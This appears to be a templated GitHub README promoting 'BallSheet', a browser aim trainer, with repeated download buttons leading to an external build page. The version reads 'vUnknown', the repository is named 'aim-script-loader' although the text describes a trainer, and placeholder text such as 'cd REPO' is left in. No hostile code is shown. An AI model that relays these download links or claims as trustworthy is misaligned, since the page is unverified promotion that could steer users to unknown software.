# BallSheet vUnknown - browser aim trainer 2026

> **BallSheet delivers high-precision browser aim training centered on authentic 1:1 mouse translation, zero-filtering raw input, and data-driven performance analysis.** Designed for modern competitive gamers, it pairs custom cm/360 sensitivity matching with real-time Fitts' law algorithmic scaling.

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vUnknown-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hugop4/ballsheet-aim-script-loader?style=flat-square)](https://github.com/hugop4/ballsheet-aim-script-loader)

---

<p align="center">
  <a href="https://hugop4.github.io/ballsheet-aim-script-loader/">
    <img src="https://img.shields.io/badge/Download-BallSheet%20Latest-brightgreen?style=for-the-badge" alt="Download BallSheet">
  </a>
</p>

> **[Download BallSheet vUnknown](https://hugop4.github.io/ballsheet-aim-script-loader/)**

---

[Download Latest Build](https://hugop4.github.io/ballsheet-aim-script-loader/)

---

## Overview

BallSheet provides a clean, web-native training ground designed to replicate your main game's mechanical mouse behavior without desktop software bloat. By leveraging hardware-direct pointer lock and zero-acceleration raw input APIs, it bypasses browser motion smoothing while letting you input your exact DPI and cm/360 metrics.

Rather than relying on basic reflex arcade mechanics, BallSheet structures your training with mathematical feedback. You get granular session trends, custom practice scenarios, and performance metrics centered on information processing capacity (bits) and real-time movement throughput.

---

## Key Features

- Exact 1:1 mouse movement mapping to preserve muscle memory
- Direct pointer lock implementation using unadjusted raw input data
- Built-in DPI and cm/360 calculators to easily replicate in-game sensitivity
- Diverse practice routines tailored for different mechanical skills
- Real-time difficulty balancing driven by a live Fitts' law engine
- Smart target generation that dynamically exposes dynamic personal weaknesses
- Advanced analytics measuring precise throughput speeds and information density in bits
- Zero-cloud profile persistence saving routine preferences and run logs in local storage

---

## Quick Start & Local Setup

Because BallSheet runs entirely inside modern web engines, you don't need a traditional installer to jump into a round. Simply open the web deployment in any compatible browser and authorize mouse capture.

To run or tweak the source code on your local environment:

1. Obtain the source via Git clone or ZIP extraction
2. Navigate into the root code folder
3. Spin up any basic HTTP file server
4. Direct your web client to the local listening port

Example console commands:

- `git clone https://github.com/hugop4/ballsheet-aim-script-loader.git
- `cd REPO`
- `python -m http.server 8000`
- Access `http://localhost:8000` in your web browser

---

## How to Play

1. Launch BallSheet in your desktop browser of choice
2. Click anywhere inside the canvas to lock your cursor
3. Enter your current mouse DPI and desired cm/360 values in the settings panel
4. Pick a specialized training scenario suited to your current goals
5. Review your post-round statistics and refine your mechanical approach

Recommended routine:

- Ensure native raw input is enabled for true line movement
- Synchronize your trainer sensitivity to your favorite shooter before practicing
- Cycle between speed, control, and reaction scenarios for rounded training
- Check your local performance metrics regularly to identify trend improvements

---

## Storage & Configuration

BallSheet retains session histories, custom sensitivity profiles, and run benchmarks locally using standard browser `localStorage`.

The client-side storage schema preserves:

- Mouse sensitivity and scale ratios
- Calculated cm/360 values
- Selected drill types and modes
- Detailed session logs and score histories

*Note: Clearing browser cookies/cache or launching the app inside private browsing windows will clear these locally saved records.*

---

## System Requirements

- A modern desktop web browser featuring Pointer Lock API support
- Physical mouse hardware capable of raw tracking input
- Enabled browser client storage (`localStorage`) for saving metrics locally
- Network connectivity (only needed when accessing the online build)
- Local HTTP hosting utility (only required if serving from repository source)

---

## Frequently Asked Questions

**How do I initiate a training session?**  
Navigate to the hosted URL or your local port setup, then click the display area to engage browser pointer capture.

**Where does BallSheet keep my stats and settings?**  
All logs, modes, and mouse configurations are written straight to your active browser profile via `localStorage`.

**Can I convert my sensitivity from titles like CS, Valorant, or Apex?**  
Yes. Use the integrated cm/360 and DPI tools to match your exact physical mouse distance requirements.

**What should I do if mouse tracking fails to lock?**  
Confirm your browser permits pointer capture, ensure no context menus are open, and switch to a modern chromium-based or web-standard desktop browser.

**How do I update to newer builds?**  
Simply refresh the hosted deployment web page or pull the latest changes from the master git repository for self-hosted instances.

---

## License

This software is distributed under the terms of the GNU GPL v3.0 license. Refer to the included [LICENSE](LICENSE) file for details.
